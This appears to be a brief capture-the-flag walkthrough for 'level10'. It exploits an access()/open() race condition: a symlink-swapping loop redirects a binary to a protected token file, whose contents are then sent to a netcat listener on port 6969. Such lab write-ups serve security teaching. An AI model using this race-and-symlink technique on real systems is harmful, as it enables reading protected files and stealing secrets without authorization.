strings level10
nm -u level10


We can see that the program use access and tcp/ip to host:6969

./level10 file host

access can result in race conditions

man access : -> 

Warning: Using access() to check if a user is authorized to, for  exam-
       ple, open a file before actually doing so using open(2) creates a secu-
       rity hole, because the user  might  exploit  the  short  time  interval
       between  checking and opening the file to manipulate it.  For this rea-
       son, the use of this system call should be avoided.


we create the file /tmp/sym.py which spam to create an symlink from token to /tmp/dummy and do it also with an random file so the binary can bypass access

then we can :
touch /tmp/abc && python /tmp/sym.py & while true; do ./level10 /tmp/dummy 127.0.0.1; done


so what happens is after the access condition there is an short time when the dummyfile which pass the access condition is replaced by link to token

connect to ssh with another shell

while true; do nc -l 6969; done
